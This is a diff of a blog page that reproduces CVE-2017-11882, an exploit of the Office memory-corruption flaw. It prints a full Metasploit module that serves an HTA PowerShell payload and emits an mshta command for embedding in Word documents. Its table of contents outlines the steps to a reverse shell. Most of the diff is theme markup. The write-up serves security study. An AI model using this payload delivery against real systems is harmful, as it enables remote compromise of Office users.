@@ -1,138 +1,203 @@
 <!DOCTYPE html>
 <html>
-  <!-- Html Head Tag-->
-  <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="">
-  <meta name="author" content="Damit 5">
-  <!-- Open Graph Data -->
-  <meta property="og:title" content="Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现"/>
-  <meta property="og:description" content="纸上得来终觉浅，绝知此事要躬行。" />
-  <meta property="og:site_name" content="Damit5&#39;s Blog"/>
-  <meta property="og:type" content="article" />
-  <meta property="og:image" content="https://damit5.com"/>
+<head>
+  <meta charset="utf-8">
+  
+  <title>microsoft office内存损坏漏洞（cve–2017–11882) 复现 | Damit5&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="damit5" />
+  
+  
+  
+  
+  <meta name="description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer3&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;//damit5.gi">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现">
+<meta property="og:url" content="https://damit5.com/2017/11/22/Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现/index.html">
+<meta property="og:site_name" content="Damit5&#39;s Blog">
+<meta property="og:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer3&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;//damit5.gi">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/4D27.50pEOiV2kj7.2TDwLkoI*ucTWf1s*Nd4hcL7jA!/r/dA0BAAAAAAAA">
+<meta property="og:image" content="https://r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/E3VPexI*az4l2foBt5E5He496qZbQFK8PrrlB.ZZFlw!/r/dG4AAAAAAAAA">
+<meta property="og:image" content="https://r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/LJpq7rg04pt97g9FtsCGynVyNs9H8grkIOZYDJmXImY!/r/dA0BAAAAAAAA">
+<meta property="og:image" content="https://r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/0MBrKpl.YtV09EHL8aG1WcIEXsow9pf4ujZSQeA7Y5k!/r/dN4AAAAAAAAA">
+<meta property="og:image" content="https://r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/eGvsprElZowK8KL0D2S1qd9VzAj6C.ExzbG7ytyyDWo!/r/dIUBAAAAAAAA">
+<meta property="og:updated_time" content="2018-02-28T13:00:46.448Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现">
+<meta name="twitter:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer3&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;//damit5.gi">
+<meta name="twitter:image" content="https://r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/4D27.50pEOiV2kj7.2TDwLkoI*ucTWf1s*Nd4hcL7jA!/r/dA0BAAAAAAAA">
   
     <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
   
-  
-    <link rel="icon" href="/favicon.png">
+
   
 
-  <!-- Site Title -->
-  <title>Damit5's Blog</title>
-
-  <!-- Bootstrap CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.min.css">
-  <!-- Custom CSS -->
+  <link rel="icon" href="/css/images/favicon.png">
+  <link rel="apple-touch-icon" href="/css/images/favicon.png">
   
-  <link rel="stylesheet" href="/css/style.dark.css">
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
 
-  <!-- Google Analytics -->
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
   
 
 </head>
 
-  <body>
-    <!-- Page Header -->
 
 
-<header class="site-header header-background" style="background-image: url(/img/background.jpg)">
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="page-title with-background-image">
-          <p class="title">Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现</p>
-          <p class="subtitle"></p>
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/favicon.png">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/AboutMe">About</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/Link">link</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
-        <div class="site-menu with-background-image">
-          <ul>
-            
-              <li>
-                <a href="/">
-                  
-                  Home
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="/archives">
-                  
-                  Archives
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://github.com/damit5/">
-                  
-                  Github
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="mailto:damit5@protonmail.com">
-                  
-                  Email
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://damit5.github.io/AboutMe">
-                  
-                  AboutMe
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://damit5.github.io/Link">
-                  
-                  Friend Link
-                  
-                </a>
-              </li>
-            
-          </ul>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
         </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div></li>
+            </div>
+          </div>
+                
       </div>
     </div>
-  </div>
+
 </header>
 
-<article>
-  <div class="container typo">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="post-info text-muted">
-          
-            <!-- Author -->
-            <span class="author info">By Damit 5</span>
-          
-          <!-- Date -->
-          <span class="date-time info">On
-            <span class="date">2017-11-22</span>
-            <span class="time">17:32:32</span>
-          </span>
-          
-        </div>
-        <!-- Tags -->
+
+
+      
+            
+      <div id="content" class="outer">
         
-          <div class="post-tags text-muted">
-            Tags: 
-
-<a class="tag" href="/tags/渗透测试/">#渗透测试</a>
-
-
-          </div>
+          <section id="main" style="float:none;"><article id="post-Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
         
-        <!-- Post Main Content -->
-        <div class="post-content">
-          <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer3" class="aplayer" style="margin-bottom: 20px;"></div>
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/11/22/Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现/" class="article-date">
+	  <time datetime="2017-11-22T03:08:28.000Z" itemprop="datePublished">2017-11-22</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer3" class="aplayer" style="margin-bottom: 20px;"></div>
 		<script>
 			new APlayer({
 				element: document.getElementById("aplayer3"),
@@ -179,42 +244,258 @@
 <p><a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="external">https://github.com/Ridter/CVE-2017-11882</a></p>
 <p><code>PS_shell.rb</code> 内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">##</div><div class="line"># This module requires Metasploit: https://metasploit.com/download</div><div class="line"># Current source: https://github.com/rapid7/metasploit-framework</div><div class="line">##</div><div class="line"></div><div class="line"></div><div class="line">class MetasploitModule  &lt; Msf::Exploit::Remote</div><div class="line">  Rank = NormalRanking</div><div class="line"></div><div class="line">  include Msf::Exploit::Remote::HttpServer</div><div class="line"></div><div class="line">  def initialize(info  = &#123;&#125;)</div><div class="line">    super(update_info(info,</div><div class="line">      &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;,</div><div class="line">      &apos;Description&apos; =&gt; %q&#123;</div><div class="line">        This module generates an command to place within</div><div class="line">        a word document, that when executed, will retrieve a HTA payload</div><div class="line">        via HTTP from an web server. Currently have not figured out how</div><div class="line">        to generate a doc.</div><div class="line">      &#125;,</div><div class="line">      &apos;License&apos; =&gt; MSF_LICENSE,</div><div class="line">      &apos;Arch&apos; =&gt; ARCH_X86,</div><div class="line">      &apos;Platform&apos; =&gt; &apos;win&apos;,</div><div class="line">      &apos;Targets&apos; =&gt;</div><div class="line">        [</div><div class="line">          [&apos;Automatic&apos;, &#123;&#125; ],</div><div class="line">        ],</div><div class="line">      &apos;DefaultTarget&apos; =&gt; 0,</div><div class="line">    ))</div><div class="line">  end</div><div class="line"></div><div class="line">  def on_request_uri(cli, _request)</div><div class="line">    print_status(&quot;Delivering payload&quot;)</div><div class="line">    p = regenerate_payload(cli)</div><div class="line">    data = Msf::Util::EXE.to_executable_fmt(</div><div class="line">      framework,</div><div class="line">      ARCH_X86,</div><div class="line">      &apos;win&apos;,</div><div class="line">      p.encoded,</div><div class="line">      &apos;hta-psh&apos;,</div><div class="line">      &#123; :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;&#125;</div><div class="line">    )</div><div class="line">    send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;)</div><div class="line">  end</div><div class="line"></div><div class="line"></div><div class="line">  def primer</div><div class="line">    url = get_uri</div><div class="line">    print_status(&quot;Place the following DDE in an MS document:&quot;)</div><div class="line">    print_line(&quot;mshta.exe \&quot;#&#123;url&#125;\&quot;&quot;)</div><div class="line">  end</div><div class="line">end</div></pre></td></tr></table></figure></p>
 
-        </div>
-      </div>
+      
     </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+
+    </footer>
   </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/11/26/MySQL基于布尔型盲注常用语句/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          MySQL基于布尔型盲注常用语句
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/10/15/XSS-绕过常用语句/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">XSS 绕过常用语句</div>
+    </a>
+  
+</nav>
+
+  
 </article>
 
+<!-- Table of Contents -->
 
-
-    <!-- Footer -->
-<footer>
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <p class="copyright text-muted">
-          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
-          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
-        <p class="copyright text-muted">
-          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
-        </p>
-      </div>
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00背景"><span class="nav-number">1.</span> <span class="nav-text">0x00背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞概述"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-生成反弹-shell-的一句话"><span class="nav-number">3.0.1.</span> <span class="nav-text">1.生成反弹 shell 的一句话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-访问该-url-，下载文件，获取-powershell-一句话"><span class="nav-number">3.0.2.</span> <span class="nav-text">2.访问该 url ，下载文件，获取 powershell 一句话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-新建文件，例如-abc"><span class="nav-number">3.0.3.</span> <span class="nav-text">3.新建文件，例如 abc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-将该文件上传到-var-www-html-目录下，并开启-apache-服务器"><span class="nav-number">3.0.4.</span> <span class="nav-text">4.将该文件上传到 /var/www/html/ 目录下，并开启 apache 服务器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-利用-exp-生成-doc"><span class="nav-number">3.0.5.</span> <span class="nav-text">5.利用 exp 生成 doc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-开启-msf-监听"><span class="nav-number">3.0.6.</span> <span class="nav-text">6.开启 msf 监听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-打开-doc"><span class="nav-number">3.0.7.</span> <span class="nav-text">7.打开 doc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-成功获得-shell"><span class="nav-number">3.0.8.</span> <span class="nav-text">8.成功获得 shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-参考文档"><span class="nav-number">4.</span> <span class="nav-text">0x03 参考文档</span></a></li></ol>
+    
     </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2017 - 2018 Damit5&#39;s Blog All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
   </div>
 </footer>
 
 
-    <!-- After Footer Scripts -->
-<script src="/js/highlight.pack.js"></script>
+<!-- min height -->
+
 <script>
-  document.addEventListener("DOMContentLoaded", function(event) {
-    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
-    codeBlocks.forEach(function(block, index) {
-      hljs.highlightBlock(block);
-    });
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/AboutMe" class="mobile-nav-link">About</a>
+  
+    <a href="/Link" class="mobile-nav-link">Link</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
   });
 </script>
 
-  </body>
-</html>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
 
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Damit5&#39;s Blog
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 Damit 5 All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
